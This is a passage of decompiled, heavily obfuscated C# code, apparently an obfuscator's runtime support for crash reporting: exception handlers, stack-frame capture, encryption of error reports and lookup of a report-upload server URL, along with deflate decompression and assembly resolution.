    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto)]
    static extern IntPtr \u0001([In] string obj0);

    static void \u0001([In] \u0002.\u0004 obj0, [In] object obj1, [In] UnhandledExceptionEventArgs obj2)
    {
      try
      {
        int num1;
        if (global::\u0005.\u007E\u0006((object) obj2) is SecurityException)
        {
          if (false)
            return;
          int num2 = \u001C.\u0012\u0002(\u0002.\u0004.\u0001, \u0007.\u0004.\u0093(442)) ? 1 : 0;
          if (true)
          {
            if (num2 == 0)
              goto label_9;
            else
              goto label_12;
          }
          else
            num1 = num2;
        }
        else
          goto label_9;
label_7:
        if (num1 != 0)
          return;
label_9:
        if (true)
        {
          if (!(global::\u0005.\u007E\u0006((object) obj2) is Exception))
            return;
          obj0.\u0001((Exception) global::\u0005.\u007E\u0006((object) obj2), !\u0014.\u007E\u0091((object) obj2), false);
          return;
        }
label_12:
        num1 = obj0.\u0001(global::\u0005.\u007E\u0006((object) obj2) as SecurityException) ? 1 : 0;
        goto label_7;
      }
      catch
      {
      }
    }

    static bool \u0001([In] \u0008.\u0002.\u0007 obj0)
    {
      bool flag;
      try
      {
        do
        {
          do
          {
            if (true)
              goto label_5;
label_3:
            continue;
label_5:
            int num1 = obj0.\u0001 < 16384 ? 1 : 0;
            int num2;
            while (true)
            {
              num2 = num1 == 0 ? 1 : 0;
              if (false)
                num1 = num2;
              else
                break;
            }
            flag = num2 != 0;
            goto label_3;
          }
          while (false);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0007 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      if (\u0016.\u007E\u0002\u0002((object) obj1, \u0007.\u0004.\u0093(532)))
      {
        \u0002.\u0002.\u0001 = \u0007.\u0004.\u0093(3655);
        return (byte[]) null;
      }
      RijndaelManaged rijndaelManaged = (RijndaelManaged) null;
      RSACryptoServiceProvider cryptoServiceProvider = (RSACryptoServiceProvider) null;
      if (true)
        goto label_28;
label_3:
      CryptoStream cryptoStream = (CryptoStream) null;
      MemoryStream memoryStream;
      try
      {
        rijndaelManaged = new RijndaelManaged();
        cryptoServiceProvider = new RSACryptoServiceProvider();
        \u008C\u0002.\u007E\u009F\u0003((object) cryptoServiceProvider, obj1);
        if (true)
          \u0011.\u007E\u001C((object) rijndaelManaged);
        \u0011.\u007E\u001D((object) rijndaelManaged);
        byte[] numArray1 = new byte[48];
        \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0007\u0003((object) rijndaelManaged), 0, (Array) numArray1, 0, 32);
        \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0008\u0003((object) rijndaelManaged), 0, (Array) numArray1, 32, 16);
        memoryStream = new MemoryStream();
        try
        {
          byte[] numArray2;
          do
          {
            numArray2 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, numArray1, false);
            \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, (byte) 1);
            \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, \u0094\u0002.\u000E\u0004(numArray2.Length / 8));
          }
          while (false);
          \u0010.\u007E\u0013((object) memoryStream, numArray2, 0, numArray2.Length);
        }
        catch (CryptographicException ex1)
        {
          try
          {
            byte[] numArray3;
            if (true)
              numArray3 = new byte[16];
label_12:
            byte[] numArray4 = new byte[16];
            \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0007\u0003((object) rijndaelManaged), 0, (Array) numArray3, 0, 16);
            \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0007\u0003((object) rijndaelManaged), 16, (Array) numArray4, 0, 16);
            byte[] numArray5 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, numArray3, false);
            byte[] numArray6;
            byte[] numArray7;
            do
            {
              numArray6 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, numArray4, false);
              numArray7 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, \u009D.\u007E\u0008\u0003((object) rijndaelManaged), false);
              \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, (byte) 2);
              if (false)
                goto label_12;
            }
            while (false);
            \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, \u0094\u0002.\u000E\u0004(numArray5.Length / 8));
            \u0010.\u007E\u0013((object) memoryStream, numArray5, 0, numArray5.Length);
            \u0010.\u007E\u0013((object) memoryStream, numArray6, 0, numArray6.Length);
            \u0010.\u007E\u0013((object) memoryStream, numArray7, 0, numArray7.Length);
          }
          catch (CryptographicException ex2)
          {
            \u0002.\u0002.\u0001 = \u0007.\u0004.\u0093(3748);
            return (byte[]) null;
          }
        }
        cryptoStream = new CryptoStream((Stream) memoryStream, \u0095\u0002.\u007E\u000F\u0004((object) rijndaelManaged), CryptoStreamMode.Write);
        \u0010.\u007E\u0013((object) cryptoStream, obj0, 0, obj0.Length);
        \u0011.\u007E\u001E((object) cryptoStream);
        return \u009D.\u007E\u0006\u0003((object) memoryStream);
      }
      catch (Exception ex)
      {
        \u0002.\u0002.\u0001 = \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(3954), \u0015.\u007E\u009C((object) ex));
        return (byte[]) null;
      }
      finally
      {
        if (rijndaelManaged != null)
          \u0011.\u007E\u001F((object) rijndaelManaged);
        if (cryptoServiceProvider != null)
          \u0011.\u007E\u007F((object) cryptoServiceProvider);
        if (memoryStream != null)
          \u0011.\u007E\u0014((object) memoryStream);
        if (cryptoStream != null)
          \u0011.\u007E\u0014((object) cryptoStream);
      }
label_28:
      memoryStream = (MemoryStream) null;
      goto label_3;
    }

    static void \u0001([In] Exception obj0, [In] object obj1)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0007.\u0004.\u0001(obj0, new object[1]
        {
          obj1
        });
        goto label_2;
      }
      while (false);
    }

    static unsafe void \u0001([In] Exception obj0, [In] object[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      *(int*) voidPtr = -1;
      *(int*) ((IntPtr) voidPtr + 4) = -1;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      StackTrace stackTrace = new StackTrace(obj0);
      try
      {
        switch (\u0015.\u007E\u009E((object) obj0))
        {
          case null:
            break;
          default:
            string[] strArray = \u009E.\u007E\u000E\u0003((object) \u0015.\u007E\u009E((object) obj0), new char[2]
            {
              '\r',
              '\n'
            });
            *(int*) ((IntPtr) voidPtr + 12) = 0;
            while (*(int*) ((IntPtr) voidPtr + 12) < strArray.Length)
            {
              string str = strArray[*(int*) ((IntPtr) voidPtr + 12)];
              if (\u0083.\u007E\u0080\u0002((object) str) > 0)
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
            }
            break;
        }
      }
      catch
      {
        *(int*) ((IntPtr) voidPtr + 8) = -1;
      }
      try
      {
        if (\u0083.\u007E\u0086\u0002((object) stackTrace) > 0)
        {
          StackFrame stackFrame = \u0006\u0002.\u007E\u0015\u0003((object) stackTrace, \u0083.\u007E\u0086\u0002((object) stackTrace) - 1);
          *(int*) voidPtr = (\u0083.\u007E\u0081\u0002((object) \u0096\u0002.\u007E\u0010\u0004((object) stackFrame)) & 16777215) - 1;
          *(int*) ((IntPtr) voidPtr + 4) = \u0083.\u007E\u0087\u0002((object) stackFrame);
        }
      }
      catch
      {
      }
      try
      {
        SmartStackFrame smartStackFrame = new SmartStackFrame(*(int*) voidPtr, obj1, *(int*) ((IntPtr) voidPtr + 4), *(int*) ((IntPtr) voidPtr + 8));
        LinkedList<object> linkedList;
        if (!\u009B.\u007E\u0004\u0003((object) \u009A.\u007E\u0003\u0003((object) obj0), (object) \u0007.\u0004.\u0093(1173)))
        {
          linkedList = new LinkedList<object>();
          \u001B.\u007E\u0011\u0002((object) \u009A.\u007E\u0003\u0003((object) obj0), (object) \u0007.\u0004.\u0093(1173), (object) linkedList);
        }
        else
          linkedList = (LinkedList<object>) \u0017.\u007E\u0004\u0002((object) \u009A.\u007E\u0003\u0003((object) obj0), (object) \u0007.\u0004.\u0093(1173));
        linkedList.AddLast((object) smartStackFrame);
      }
      catch
      {
      }
    }

    static void \u0001([In] \u0008.\u0005 obj0, [In] \u0008.\u0006 obj1)
    {
      \u0008.\u0006 obj2;
      \u0008.\u0006 comparand;
      \u0008.\u0006 obj3;
      try
      {
        obj3 = obj0.\u0001;
        do
        {
          comparand = obj3;
          obj2 = (\u0008.\u0006) \u0083\u0002.\u0094\u0003((Delegate) comparand, (Delegate) obj1);
          obj3 = Interlocked.CompareExchange<\u0008.\u0006>(ref obj0.\u0001, obj2, comparand);
        }
        while (obj3 != comparand);
      }
      catch (Exception ex)
      {
        \u0008.\u0006 obj4 = obj3;
        \u0008.\u0006 obj5 = comparand;
        \u0008.\u0006 obj6 = obj2;
        \u0008.\u0005 obj7 = obj0;
        \u0008.\u0006 obj8 = obj1;
        \u0007.\u0004.\u0001(ex, (object) obj4, (object) obj5, (object) obj6, (object) obj7, (object) obj8);
        throw;
      }
    }

    static void \u0001([In] \u0002.\u0004 obj0, [In] object obj1, [In] ThreadExceptionEventArgs obj2)
    {
      try
      {
        Exception exception;
        if (true)
          exception = \u0099.\u007E\u0002\u0003((object) obj2);
        else
          goto label_4;
label_2:
        Type type = \u0082.\u007E\u001F\u0002((object) exception);
label_4:
        if (\u001C.\u0012\u0002(\u0015.\u007E\u0094((object) type), \u0007.\u0004.\u0093(1855)) && \u001C.\u0012\u0002(\u0015.\u007E\u0099((object) type), \u0007.\u0004.\u0093(1880)))
          exception = (Exception) \u0017.\u007E\u0005\u0002((object) \u009C.\u007E\u0005\u0003((object) type, \u0007.\u0004.\u0093(1925)), (object) exception);
        if (exception is SecurityException)
        {
          if (true)
          {
            int num = \u001C.\u0012\u0002(\u0002.\u0004.\u0001, \u0007.\u0004.\u0093(442)) ? 1 : 0;
            if (true)
            {
              if (num != 0)
                num = obj0.\u0001(exception as SecurityException) ? 1 : 0;
              else
                goto label_12;
            }
            if (num != 0)
              return;
          }
          else
            goto label_2;
        }
label_12:
        obj0.\u0001(exception, true, false);
      }
      catch
      {
      }
    }

    static unsafe bool \u0001([In] bool obj0, [In] bool obj1, [In] \u0008.\u0002.\u0008 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(25);
      int num;
      bool flag;
      try
      {
        if (obj2.\u0006 >= 262 || obj0)
        {
          while (obj2.\u0006 >= 262 || obj0)
          {
            if (obj2.\u0006 != 0)
            {
              if (obj2.\u0005 >= 65274)
                \u0007.\u0004.\u0001(obj2);
              *(int*) voidPtr = obj2.\u0002;
              num = obj2.\u0003;
              if (obj2.\u0006 >= 3)
              {
                *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0004.\u0001(obj2);
                if (*(int*) ((IntPtr) voidPtr + 4) != 0 && obj2.\u0005 - *(int*) ((IntPtr) voidPtr + 4) <= 32506 && \u0007.\u0004.\u0001(obj2, *(int*) ((IntPtr) voidPtr + 4)) && obj2.\u0003 <= 5 && obj2.\u0003 == 3 && obj2.\u0005 - obj2.\u0002 > 4096)
                  obj2.\u0003 = 2;
              }
              if (num >= 3 && obj2.\u0003 <= num)
              {
                \u0008.\u0002.\u0007 obj = obj2.\u0001;
                *(int*) ((IntPtr) voidPtr + 16) = obj2.\u0005 - 1 - *(int*) voidPtr;
                \u0007.\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 16), obj, num);
                num -= 2;
                do
                {
                  ++obj2.\u0005;
                  --obj2.\u0006;
                  if (obj2.\u0006 >= 3)
                    \u0007.\u0004.\u0001(obj2);
                }
                while (--num > 0);
                ++obj2.\u0005;
                --obj2.\u0006;
                obj2.\u0001 = false;
                obj2.\u0003 = 2;
              }
              else
              {
                if (obj2.\u0001)
                  \u0007.\u0004.\u0001(obj2.\u0001, (int) obj2.\u0001[obj2.\u0005 - 1] & (int) byte.MaxValue);
                obj2.\u0001 = true;
                ++obj2.\u0005;
                --obj2.\u0006;
              }
              if (\u0007.\u0004.\u0001(obj2.\u0001))
              {
                *(int*) ((IntPtr) voidPtr + 8) = obj2.\u0005 - obj2.\u0004;
                if (obj2.\u0001)
                  *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - 1;
                flag = obj1 && obj2.\u0006 == 0 && !obj2.\u0001;
                \u0008.\u0002.\u0007 obj = obj2.\u0001;
                byte[] numArray = obj2.\u0001;
                *(int*) ((IntPtr) voidPtr + 12) = obj2.\u0004;
                \u0007.\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 12), *(int*) ((IntPtr) voidPtr + 8), obj, flag, numArray);
                obj2.\u0004 += *(int*) ((IntPtr) voidPtr + 8);
                *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) !flag;
                goto label_28;
              }
            }
            else
            {
              if (obj2.\u0001)
                goto label_26;
label_2:
              obj2.\u0001 = false;
              \u0008.\u0002.\u0007 obj = obj2.\u0001;
              byte[] numArray = obj2.\u0001;
              *(int*) ((IntPtr) voidPtr + 12) = obj2.\u0004;
              *(int*) ((IntPtr) voidPtr + 20) = obj2.\u0005 - obj2.\u0004;
              \u0007.\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 12), *(int*) ((IntPtr) voidPtr + 20), obj, obj1, numArray);
              obj2.\u0004 = obj2.\u0005;
              *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 0;
              goto label_28;
label_26:
              \u0007.\u0004.\u0001(obj2.\u0001, (int) obj2.\u0001[obj2.\u0005 - 1] & (int) byte.MaxValue);
              goto label_2;
            }
          }
          *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 1;
        }
        else
          *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<bool> local5 = (ValueType) flag;
        \u0008.\u0002.\u0008 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local6 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local7 = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj, (object) local6, (object) local7);
        throw;
      }
label_28:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 24);
    }

    static void \u0001([In] \u0008.\u0007 obj0)
    {
      Thread thread1;
      \u0008.\u0007.\u0001 obj1;
      try
      {
        if (\u0008.\u0007.\u0001)
          return;
        obj1 = new \u0008.\u0007.\u0001();
        obj1.\u0001 = obj0;
        obj1.\u0001 = \u0007.\u0004.\u0001();
        // ISSUE: method pointer
        thread1 = new Thread(new ThreadStart((object) obj1, __methodptr(\u0001)));
        \u001B\u0002.\u007E\u0086\u0003((object) thread1, true);
        \u0097\u0002.\u007E\u0011\u0004((object) thread1, ApartmentState.STA);
        \u0011.\u007E\u0080((object) thread1);
        \u0098\u0002.\u007E\u0012\u0004((object) \u0010\u0002.\u001A\u0003(), new EventHandler(obj0.\u0001));
        \u0008.\u0007.\u0001 = true;
      }
      catch (Exception ex)
      {
        Thread thread2 = thread1;
        \u0008.\u0007.\u0001 obj2 = obj1;
        \u0008.\u0007 obj3 = obj0;
        \u0007.\u0004.\u0001(ex, (object) thread2, (object) obj2, (object) obj3);
        throw;
      }
    }

    static unsafe bool \u0001([In] \u0008.\u0002.\u0001 obj0)
    {
      int num1 = 13;
      do
      {
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          void* voidPtr = (void*) __untypedstackalloc(num1);
          int num2;
          int index;
          try
          {
            int num3 = \u0007.\u0004.\u0001(obj0.\u0001);
            if (true)
              goto label_38;
label_36:
            while (num2 >= 258)
            {
              *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
              int num4 = *(int*) ((IntPtr) voidPtr + 8);
              int num5;
              while (true)
              {
                int num6 = num4 - 7;
                int num7;
                while (true)
                {
                  switch (num6)
                  {
                    case 0:
                      while (((index = \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0001)) & -256) == 0)
                      {
                        \u0007.\u0004.\u0001(obj0.\u0001, index);
                        num7 = num2 - 1;
                        if (true)
                        {
                          num2 = num7;
                          if (num7 < 258)
                          {
                            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                            goto label_42;
                          }
                        }
                        else
                          goto label_30;
                      }
                      if (index < 257)
                      {
                        num5 = index;
                        if (false)
                        {
                          num6 = num5;
                          continue;
                        }
                        goto label_13;
                      }
                      else
                        goto label_16;
                    case 1:
                      goto label_17;
                    case 2:
                      goto label_24;
                    case 3:
                      goto label_28;
                    default:
                      goto label_36;
                  }
                }
label_16:
                obj0.\u0003 = \u0008.\u0002.\u0001.\u0001[index - 257];
                obj0.\u0002 = \u0008.\u0002.\u0001.\u0002[index - 257];
label_17:
                if (obj0.\u0002 <= 0)
                  goto label_23;
label_18:
                obj0.\u0001 = 8;
                *(int*) voidPtr = \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0002);
label_19:
                int num8 = *(int*) voidPtr;
                if (false)
                {
                  num4 = num8;
                  continue;
                }
                if (num8 >= 0)
                {
                  \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0002);
                  obj0.\u0003 += *(int*) voidPtr;
                }
                else
                  goto label_21;
label_23:
                obj0.\u0001 = 9;
label_24:
                index = \u0007.\u0004.\u0001(obj0.\u0002, obj0.\u0001);
                if (index < 0)
                {
                  if (false)
                    goto label_19;
                  else
                    goto label_26;
                }
                else
                {
                  obj0.\u0004 = \u0008.\u0002.\u0001.\u0003[index];
                  obj0.\u0002 = \u0008.\u0002.\u0001.\u0004[index];
                }
label_28:
                if (obj0.\u0002 > 0)
                {
                  obj0.\u0001 = 10;
                  *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0002);
                  int num9 = *(int*) ((IntPtr) voidPtr + 4);
                  num7 = 0;
                  num7 = num9;
                }
                else
                  goto label_34;
label_30:
                if (num7 >= num7)
                {
                  if (false)
                    goto label_18;
                  else
                    goto label_33;
                }
                else
                  goto label_31;
              }
label_13:
              if (num5 < 0)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                goto label_42;
              }
              else
              {
                obj0.\u0002 = (\u0008.\u0002.\u0004) null;
                obj0.\u0001 = (\u0008.\u0002.\u0004) null;
                obj0.\u0001 = 2;
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                goto label_42;
              }
label_21:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_26:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_31:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_33:
              \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0002);
              obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
label_34:
              if (true)
              {
                \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
                num2 -= obj0.\u0003;
                obj0.\u0001 = 7;
              }
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            goto label_42;
label_38:
            num2 = num3;
            goto label_36;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) *(int*) voidPtr;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
            \u0008.\u0002.\u0001 obj = obj0;
            \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj);
            throw;
          }
label_42:
          num1 = (int) *(sbyte*) ((IntPtr) voidPtr + 12);
        }
      }
      while (false);
      return num1 != 0;
    }

    static \u0008.\u0002.\u0004 \u0001([In] \u0008.\u0002.\u0005 obj0)
    {
      byte[] destinationArray;
      try
      {
        do
        {
          destinationArray = new byte[obj0.\u0002];
        }
        while (false);
        Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
        return new \u0008.\u0002.\u0004(destinationArray);
      }
      catch (Exception ex)
      {
        byte[] numArray = destinationArray;
        \u0008.\u0002.\u0005 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u000E.\u0003 obj0, [In] bool obj1) => obj0.\u0003 = obj1;

    [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
    static void \u0001([In] \u0002.\u0004 obj0)
    {
      do
      {
        if (obj0 != null)
          goto label_4;
label_3:
        continue;
label_4:
        \u0002.\u0004.\u0001 = obj0;
        // ISSUE: method pointer
        \u0099\u0002.\u007E\u0013\u0004((object) \u0010\u0002.\u001A\u0003(), new UnhandledExceptionEventHandler((object) obj0, __methodptr(\u0001)));
        if (true)
        {
          \u009A\u0002 obj = \u009A\u0002.\u0014\u0004;
          // ISSUE: method pointer
          ThreadExceptionEventHandler exceptionEventHandler = new ThreadExceptionEventHandler((object) obj0, __methodptr(\u0001));
          if (true)
          {
            obj(exceptionEventHandler);
            goto label_3;
          }
          else
            goto label_3;
        }
      }
      while (false);
    }

    static void \u0001()
    {
      try
      {
        try
        {
          \u0001.\u0007.\u0001(\u008F\u0002.\u0004\u0004((object) \u0007.\u0004.\u0093(3971), (object) \u001C\u0002.\u0088\u0003()));
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    static void \u0001()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0007.\u0004.\u0001);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    static int \u0001([In] \u0008.\u0002.\u000F obj0)
    {
      int num1;
      try
      {
        if (true)
        {
          int num2 = \u0007.\u0004.\u0001(obj0);
          int num3;
          while (true)
          {
            int num4 = \u0007.\u0004.\u0001(obj0);
            int num5;
            while (true)
            {
              num5 = num4 << 16;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
            if (false)
              num2 = num3;
            else
              break;
          }
          num1 = num3;
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000F obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8)
    {
      \u0007.\u0004.\u0001(obj0, new object[8]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8
      });
    }

    static bool \u0001([In] \u0008.\u0002.\u0006 obj0)
    {
      bool flag;
      try
      {
        do
        {
          int num;
          if (obj0.\u0001 != 30)
          {
            num = 0;
            if (num == 0)
              flag = num != 0;
            else
              goto label_4;
          }
          else
            goto label_3;
label_2:
          continue;
label_3:
          num = \u0007.\u0004.\u0001(obj0.\u0001) ? 1 : 0;
label_4:
          flag = num != 0;
          if (false)
            goto label_2;
          else
            break;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0006 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u0003.\u0006 obj0, [In] \u0004.\u0002 obj1)
    {
      \u0003.\u0006 obj2 = obj1.\u0001;
label_4:
      \u0003.\u0006 comparand = obj2;
      do
      {
        \u0003.\u0006 obj3 = (\u0003.\u0006) \u0083\u0002.\u0094\u0003((Delegate) comparand, (Delegate) obj0);
        \u0003.\u0006 obj4;
        if (true)
          obj4 = obj3;
        obj2 = Interlocked.CompareExchange<\u0003.\u0006>(ref obj1.\u0001, obj4, comparand);
        if (obj2 != comparand)
          goto label_4;
      }
      while (false);
    }

    static void \u0001([In] \u000E.\u0004 obj0, [In] \u0004.\u0003 obj1)
    {
      if (obj1.\u0003 == null)
      {
        try
        {
          UploadReportLoginService reportLoginService1 = new UploadReportLoginService();
          UploadReportLoginService reportLoginService2;
          if (true)
            reportLoginService2 = reportLoginService1;
          if (obj1.\u0001 != null)
            \u007F\u0002.\u007E\u008E\u0003((object) reportLoginService2, obj1.\u0001);
          obj1.\u0003 = reportLoginService2.GetServerURL(obj1.\u0002);
          if (\u0083.\u007E\u0080\u0002((object) obj1.\u0003) == 0)
            throw new ApplicationException(\u0007.\u0004.\u0093(3345));
          if (\u001C.\u0012\u0002(obj1.\u0003, \u0007.\u0004.\u0093(3386)))
            obj1.\u0003 = \u0004.\u0003.\u0001;
        }
        catch (Exception ex)
        {
          obj0(\u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(3395), \u0015.\u007E\u009C((object) ex)));
          return;
        }
      }
      obj0(\u0016.\u007E\u0002\u0002((object) obj1.\u0003, \u0007.\u0004.\u0093(2255)) ? obj1.\u0003 : \u0007.\u0004.\u0093(3327));
    }

    static string \u0001() => \u0007.\u0004.\u0001().\u0001;

    static byte[] \u0001([In] byte[] obj0)
    {
      byte[] numArray1;
      try
      {
        numArray1 = \u0007.\u0004.\u0001(1, (byte[]) null, (byte[]) null, obj0);
      }
      catch (Exception ex)
      {
        byte[] numArray2 = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray2);
        throw;
      }
      return numArray1;
    }

    static \u0002.\u0005.\u0001 \u0001()
    {
      if (!\u0002.\u0005.\u0001)
      {
        \u0002.\u0005.\u0001 = new \u0002.\u0005.\u0001();
        try
        {
          do
          {
            // ISSUE: type reference
            \u0002.\u0005.\u0001.\u0001 = \u009B\u0002.\u0015\u0004(\u0012.\u0083(__typeref (\u0002.\u0005.\u0001)));
            int num = (int) \u0007.\u0004.\u0001(ref \u0002.\u0005.\u0001);
            if (true)
            {
              if (false)
                goto label_7;
            }
            else
              goto label_7;
          }
          while (false);
          \u0002.\u0005.\u0001 = true;
        }
        catch
        {
        }
      }
label_7:
      return \u0002.\u0005.\u0001;
    }

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] \u0008.\u0001 obj1,
      [In] byte[] obj2,
      [In] bool obj3)
    {
      object[] objArray1;
      MethodInfo method;
      try
      {
        MethodInfo setMethod1 = obj1.\u0001.GetProperty("Key").GetSetMethod();
        object obj4 = obj1.\u0001;
        objArray1 = new object[1]{ (object) obj2 };
        object[] parameters1 = objArray1;
        setMethod1.Invoke(obj4, parameters1);
        MethodInfo setMethod2 = obj1.\u0001.GetProperty("IV").GetSetMethod();
        object obj5 = obj1.\u0001;
        objArray1 = new object[1]{ (object) obj0 };
        object[] parameters2 = objArray1;
        setMethod2.Invoke(obj5, parameters2);
        method = obj1.\u0001.GetMethod(obj3 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
        return (ICryptoTransform) method.Invoke(obj1.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo = method;
        object[] objArray2 = objArray1;
        \u0008.\u0001 obj = obj1;
        byte[] numArray1 = obj2;
        byte[] numArray2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj3;
        \u0007.\u0004.\u0001(ex, (object) methodInfo, (object) objArray2, (object) obj, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    static void \u0001([In] long obj0, [In] string obj1)
    {
      IsolatedStorageFileStream storageFileStream1;
      ulong num1;
      try
      {
        storageFileStream1 = \u0007.\u0004.\u0001(FileMode.OpenOrCreate, obj1, FileAccess.ReadWrite);
        try
        {
          \u009C\u0002 obj = \u009C\u0002.\u007E\u0016\u0004;
          IsolatedStorageFileStream storageFileStream2 = storageFileStream1;
          long num2 = obj0 + 8L;
          if (true)
            goto label_3;
label_2:
          \u009C\u0002.\u007E\u0016\u0004((object) storageFileStream1, obj0);
          num1 = \u009D\u0002.\u007E\u0017\u0004((object) new BinaryReader((Stream) storageFileStream1));
          ++num1;
          \u009C\u0002.\u007E\u0016\u0004((object) storageFileStream1, obj0);
          \u009E\u0002.\u007E\u0018\u0004((object) new BinaryWriter((Stream) storageFileStream1), num1);
          return;
label_3:
          obj((object) storageFileStream2, num2);
          goto label_2;
        }
        finally
        {
          if (storageFileStream1 != null)
            \u0011.\u007E\u0015((object) storageFileStream1);
        }
      }
      catch (Exception ex)
      {
        IsolatedStorageFileStream storageFileStream3 = storageFileStream1;
        // ISSUE: variable of a boxed type
        __Boxed<ulong> local1 = (ValueType) num1;
        string str = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<long> local2 = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) storageFileStream3, (object) local1, (object) str, (object) local2);
        throw;
      }
    }

    static string \u0001([In] string obj0)
    {
      byte[] numArray1;
